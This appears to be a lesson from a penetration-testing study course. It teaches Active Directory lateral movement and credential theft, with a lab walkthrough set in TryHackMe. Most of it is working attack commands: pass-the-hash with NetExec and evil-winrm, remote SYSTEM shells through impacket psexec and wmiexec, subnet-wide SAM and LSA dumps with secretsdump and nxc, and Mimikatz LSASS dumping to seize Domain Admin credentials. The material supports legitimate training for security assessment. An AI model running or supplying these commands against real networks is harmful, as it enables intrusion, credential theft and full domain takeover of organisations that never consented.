# Active Directory Module — Lesson 4: Lateral Movement & Credential Access

**Methodology phase:** Post-exploitation — executing the path BloodHound found by hopping between hosts and harvesting credentials as you go.
**Why it matters for PT1:** reviewers named **impacket**, **NetExec (nxc)**, and **Mimikatz**. AD compromise is a loop: land on a host → dump its credentials → use those to reach the next host → repeat until you hit the DC. This lesson is that loop.

**The key insight — you often don't need the password.** Windows authenticates with the **NTLM hash**, so a dumped hash is as good as the password for most attacks. That's **pass-the-hash**, and it's why credential *dumping* matters more than cracking.

---

## 1. The three ways to "use" a credential

Once you have `user:password` **or** `user:NThash`, you can authenticate. Learn all three shapes:

```bash
# password
nxc smb 10.10.x.10 -u admin -p 'Password1'
# NTLM hash (pass-the-hash) — note -H, and the LM:NT or just NT form
nxc smb 10.10.x.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
# just the NT hash
nxc smb 10.10.x.10 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```
- `-H` takes the hash instead of `-p`. If `nxc` returns `(Pwn3d!)`, you're local admin on that host — you can dump its secrets and get a shell.

> **Why the hash sometimes has two halves (`LM:NT`).** A full NTLM hash looks like `aad3b435...:31d6cfe0...`. The **first** part is the old **LM** hash (`aad3b435b51404eeaad3b435b51404ee` is the well-known value for *empty/disabled LM* — you'll see it constantly). The **second** part is the **NT** hash, which is the one that actually matters. Tools accept either the full `LM:NT` string or just the NT half — both work for pass-the-hash. When in doubt, use the NT part (the second one).

---

## 2. Getting an interactive shell on a host you admin

Once a credential/hash is admin on a target, pick a shell tool:

```bash
# impacket-psexec — SYSTEM shell over SMB (creates a service; noisy but reliable)
impacket-psexec corp.local/admin:'Password1'@10.10.x.10
impacket-psexec -hashes ':31d6cfe0...' corp.local/admin@10.10.x.10    # pass-the-hash

# impacket-wmiexec — semi-interactive, stealthier (no service created)
impacket-wmiexec corp.local/admin:'Password1'@10.10.x.10

# evil-winrm — if WinRM (5985) is open; the nicest shell
evil-winrm -i 10.10.x.10 -u admin -p 'Password1'
evil-winrm -i 10.10.x.10 -u admin -H 31d6cfe0...          # pass-the-hash
```
- `psexec` → SYSTEM but loud (drops a service, logs an event). `wmiexec` → your user's context, quieter. `evil-winrm` → cleanest when WinRM is available and supports `-H` for pass-the-hash.
- All three accept `-hashes`/`-H`, so you rarely need to crack anything to move.

## 3. Dumping credentials from a host

This is the "harvest" half of the loop. Once you're admin/SYSTEM on a machine, pull every credential it holds.

**Remotely with impacket-secretsdump** (no shell needed, just admin creds):
```bash
impacket-secretsdump corp.local/admin:'Password1'@10.10.x.10
impacket-secretsdump -hashes ':31d6cfe0...' corp.local/admin@10.10.x.10
```
- Dumps the local SAM (local account hashes), LSA secrets, and cached domain creds. Each NT hash it returns is a new pass-the-hash key for the next host.

**With nxc in one sweep** (dump SAM across everything you're admin on):
```bash
nxc smb 10.10.x.0/24 -u admin -p 'Password1' --sam
nxc smb 10.10.x.0/24 -u admin -H <hash> --lsa
```
- `--sam` local account hashes · `--lsa` LSA secrets (often service-account passwords in cleartext). Run across the subnet to harvest everywhere at once.

**On-host with Mimikatz** (reviewers named it) — pulls plaintext passwords and hashes from LSASS memory:
```
# in an elevated shell on the Windows host:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
- `privilege::debug` grabs the SeDebug right needed to read LSASS.
- `sekurlsa::logonpasswords` dumps credentials of everyone logged on — including, if you're lucky, a Domain Admin who left a session on that box. That's an instant win.

> **Why sessions matter:** BloodHound's session data (Lesson 3) shows *where high-value users are logged in*. If a Domain Admin has a session on a host you can reach, dumping LSASS there hands you their credentials directly — no cracking, no ACL chain.

## 4. The lateral movement loop

Put it together — this is the rhythm of the whole AD section:

```
1. You have a credential/hash.
2. nxc smb <subnet> with it  ->  find hosts showing (Pwn3d!)
3. secretsdump / mimikatz on a Pwn3d host  ->  new hashes & passwords
4. Any new cred a DA? a step closer per BloodHound?  ->  yes: go there
5. Repeat until you can reach the Domain Controller / a DA account.
```

Every dumped hash is a key. Every `(Pwn3d!)` is a place to dump more keys. You loop until a key opens the DC.

## 5. Worked example — hash to the next host to a DA session

Room: **[TryHackMe — Post-Exploitation Basics](https://tryhackme.com/room/postexploit)** / *Attacktive Directory*.

1. **You cracked `svc-sql`** (Lesson 2). `nxc smb 10.10.x.0/24 -u svc-sql -p 'MSSQLpassw0rd!'` shows `(Pwn3d!)` on `WS01`.
2. **Dump WS01:** `impacket-secretsdump corp.local/svc-sql:'MSSQLpassw0rd!'@10.10.x.20` → local admin hash + a cached domain cred for `helpdesk`.
3. **Pass-the-hash to the next box:** `nxc smb 10.10.x.21 -u helpdesk -H <hash>` → `(Pwn3d!)` on `WS02`.
4. **Mimikatz on WS02:** `sekurlsa::logonpasswords` reveals a **Domain Admin** left a session there → you now have `Administrator`'s hash.
5. **Head to the DC** with that hash — Lesson 5 finishes the domain.

> **Dead end kept in:** `impacket-psexec` failed with `RemoteException ... STATUS_ACCESS_DENIED` even with a valid hash — because that account wasn't *local admin* on the target (only a normal user). `nxc` had shown `[+]` (valid) but not `(Pwn3d!)` (admin), and I skimmed past the difference. Lesson: `[+]` means the cred works; `(Pwn3d!)` means it's admin. You need `(Pwn3d!)` to get a shell or dump — read the marker.

## 7. Carry forward

- The loop: authenticate → find `(Pwn3d!)` hosts → dump credentials → use new keys → repeat to the DC. `[+]` = valid, `(Pwn3d!)` = admin — the distinction decides whether you can dump.
- Pass-the-hash (`-H`) means you rarely crack anything — a dumped NT hash authenticates directly.
- LSASS/session dumping (Mimikatz) can shortcut the whole chain if a DA has a session on a reachable host — check BloodHound's session data.
